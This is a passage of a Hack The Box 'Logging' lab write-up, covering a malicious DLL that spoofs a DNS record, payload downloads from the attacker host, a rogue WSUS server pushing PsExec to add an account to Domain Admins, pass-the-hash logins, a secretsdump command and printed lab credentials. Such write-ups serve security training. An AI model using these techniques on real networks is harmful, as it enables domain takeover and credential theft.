+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil_dns.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ul_reason_for_call == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        system(<span class="string">&quot;powershell -ep bypass -c \&quot;IEX(Get-Content C:\\\\ProgramData\\\\UpdateMonitor\\\\Invoke-DNSUpdate.ps1 -Raw); Invoke-DNSUpdate -DNSType A -DNSName wsus.logging.htb -DNSData 10.10.16.91\&quot; &gt; C:\\\\ProgramData\\\\UpdateMonitor\\\\dns_out.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;icacls C:\\\\ProgramData\\\\UpdateMonitor\\\\dns_out.txt /grant Everyone:F &gt;nul 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Build, zip, and upload it together with the <code>Invoke-DNSUpdate.ps1</code> script:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i686-w64-mingw32-gcc -shared -m32 -o settings_update.dll evil_dns.c -Wl,--subsystem,windows</span><br><span class="line">zip Settings_Update.zip settings_update.dll</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">curl</span> http://<span class="number">10.10</span>.<span class="number">16.91</span>:<span class="number">8888</span>/<span class="built_in">Invoke-DNSUpdate</span>.ps1 <span class="literal">-o</span> C:\ProgramData\UpdateMonitor\<span class="built_in">Invoke-DNSUpdate</span>.ps1</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">curl</span> http://<span class="number">10.10</span>.<span class="number">16.91</span>:<span class="number">8888</span>/Settings_Update.zip <span class="literal">-o</span> C:\ProgramData\UpdateMonitor\Settings_Update.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>After the next cycle we confirm the record was added:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">type</span> C:\ProgramData\UpdateMonitor\dns_out.txt</span><br><span class="line">[+] DNS update successful</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Rogue-WSUS-Server"><a href="#Rogue-WSUS-Server" class="headerlink" title="Rogue WSUS Server"></a>Rogue WSUS Server</h3><p>At this point the DC will resolve <code>wsus.logging.htb</code> to us and trust a TLS certificate we hold for it, which is everything a WSUS client needs to accept updates from a server we control. We start by pointing the hostname at ourselves locally so <code>wsuks</code> can bind to it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.16.91 wsus.logging.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<p>Then install <code>wsuks</code>, the WSUS MITM attack tool:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --break-system-packages wsuks</span><br><span class="line">sudo apt install -y python3-nftables</span><br></pre></td></tr></table></figure></div>
+
+<p>We launch the rogue WSUS server with a payload command that adds <code>msa_health$</code> to Domain Admins. The <code>-c</code> flag is passed to <code>PsExec64.exe</code>, a Microsoft-signed binary bundled with <code>wsuks</code> that WSUS is perfectly happy to deploy as a signed update and run as SYSTEM:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">env</span> PATH=<span class="string">&quot;/home/kali/.local/bin:<span class="variable">$PATH</span>&quot;</span> PYTHONPATH=<span class="string">&quot;/home/kali/.local/lib/python3.13/site-packages&quot;</span> \</span><br><span class="line">  /home/kali/.local/bin/wsuks --serve-only \</span><br><span class="line">  --WSUS-Server wsus.logging.htb --tls-cert wsus.pem \</span><br><span class="line">  --WSUS-Port 8531 -I tun0 \</span><br><span class="line">  -c <span class="string">&#x27;/accepteula -s net group &quot;Domain Admins&quot; msa_health$ /add /domain&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    __          __ _____  _    _  _  __  _____</span><br><span class="line">    \ \        / // ____|| |  | || |/ / / ____|</span><br><span class="line">     \ \  /\  / /| (___  | |  | || &#x27; / | (___</span><br><span class="line">      \ \/  \/ /  \___ \ | |  | ||  &lt;   \___ \</span><br><span class="line">       \  /\  /   ____) || |__| || . \  ____) |</span><br><span class="line">        \/  \/   |_____/  \____/ |_|\_\|_____/</span><br><span class="line"></span><br><span class="line">     Pentesting Tool for the WSUS MITM Attack</span><br><span class="line">               Made by NeffIsBack</span><br><span class="line">                 version: 1.2.1</span><br><span class="line"></span><br><span class="line">[+] Command to execute:</span><br><span class="line">PsExec64.exe /accepteula -s net group &quot;Domain Admins&quot; msa_health$ /add /domain</span><br><span class="line">[*] ===== Starting Web Server =====</span><br><span class="line">[*] Using TLS certificate &#x27;wsus.pem&#x27; for HTTPS WSUS Server</span><br><span class="line">[*] Starting WSUS Server on 10.10.16.91:8531...</span><br><span class="line">[*] Serving executable as KB: 4226061</span><br><span class="line">[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: &quot;.../GetConfig&quot;</span><br><span class="line">[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: &quot;.../GetCookie&quot;</span><br><span class="line">[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: &quot;.../SyncUpdates&quot;</span><br><span class="line">[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: &quot;.../GetCookie&quot;</span><br><span class="line">[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: &quot;.../GetExtendedUpdateInfo&quot;</span><br><span class="line">[+] Received GET request: /64132e34-28c5-4bc7-a639-d7cb406212f4/PsExec64.exe</span><br><span class="line">[+] GET request for exe: /64132e34-28c5-4bc7-a639-d7cb406212f4/PsExec64.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>The GET request for <code>PsExec64.exe</code> in the log is the DC pulling our malicious “update”. Within a couple of minutes the <code>ForceSync</code> task from the incident ticket kicks the WSUS client into a check-in, it connects to our rogue server, downloads the signed executable, and runs it as SYSTEM.</p>
+<h3 id="Confirming-Domain-Admin"><a href="#Confirming-Domain-Admin" class="headerlink" title="Confirming Domain Admin"></a>Confirming Domain Admin</h3><p>We verify that the payload landed and <code>msa_health$</code> is now a Domain Admin:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> /domain</span><br><span class="line"><span class="built_in">Group</span> name     Domain Admins</span><br><span class="line">Comment        Designated administrators of the domain</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator            msa_health<span class="variable">$</span>              toby.brynleigh</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h3><p>A fresh WinRM session picks up the new group membership, and as a Domain Admin we can read the root flag from <code>toby.brynleigh</code>‘s desktop:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u <span class="string">&#x27;msa_health$&#x27;</span> -H 603fc24ee01a9409f83c9d1d701485c5 -i dc01.logging.htb</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">type</span> C:\Users\toby.brynleigh\Desktop\root.txt</span><br><span class="line"><span class="number">02</span>e01a65b12970b9119efee8c44016c5</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post-Exploitation"></a>Post-Exploitation</h2><p>With Domain Admin in hand, everything else falls out. We can dump the domain’s secrets with secretsdump using the <code>msa_health$</code> hash:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump <span class="string">&#x27;logging.htb/msa_health$@dc01.logging.htb&#x27;</span> -hashes :603fc24ee01a9409f83c9d1d701485c5</span><br></pre></td></tr></table></figure></div>
+
+<p>And from a SYSTEM shell the vault yields cleartext credentials as well:</p>
+<ul>
+<li><code>jaylee.clifton</code> : <code>wNR*k5OzdtsvD$4WG!</code></li>
+<li><code>Administrator</code> : <code>ParolaptController2026#</code></li>
+</ul>
+<p>That was it for Logging, hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Logging</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-07-23 19:05:31</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-07-23 19:11:40
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/07/23/Hackthebox-Logging/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/07/14/Hackthebox-Cctv/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Cctv</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Logging</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Initial-Access-SMB-Enumeration"><span class="nav-text">Initial Access - SMB Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Credential-Discovery-from-Logs"><span class="nav-text">Credential Discovery from Logs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-1-Shadow-Credentials-on-msa-health"><span class="nav-text">Privilege Escalation #1 - Shadow Credentials on msa_health$</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-2-DLL-Hijacking-User-Flag"><span class="nav-text">Privilege Escalation #2 - DLL Hijacking (User Flag)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-3-ADCS-ESC17-WSUS-Abuse-Root-Flag"><span class="nav-text">Privilege Escalation #3 - ADCS ESC17 + WSUS Abuse (Root Flag)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Obtaining-jaylee-clifton%E2%80%99s-TGT-via-Rubeus"><span class="nav-text">Obtaining jaylee.clifton’s TGT via Rubeus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Converting-the-Ticket-and-Getting-jaylee%E2%80%99s-NT-Hash"><span class="nav-text">Converting the Ticket and Getting jaylee’s NT Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ESC17-Requesting-a-Certificate-for-wsus-logging-htb"><span class="nav-text">ESC17 - Requesting a Certificate for wsus.logging.htb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-Record-Manipulation"><span class="nav-text">DNS Record Manipulation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rogue-WSUS-Server"><span class="nav-text">Rogue WSUS Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Confirming-Domain-Admin"><span class="nav-text">Confirming Domain Admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Post-Exploitation"><span class="nav-text">Post-Exploitation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
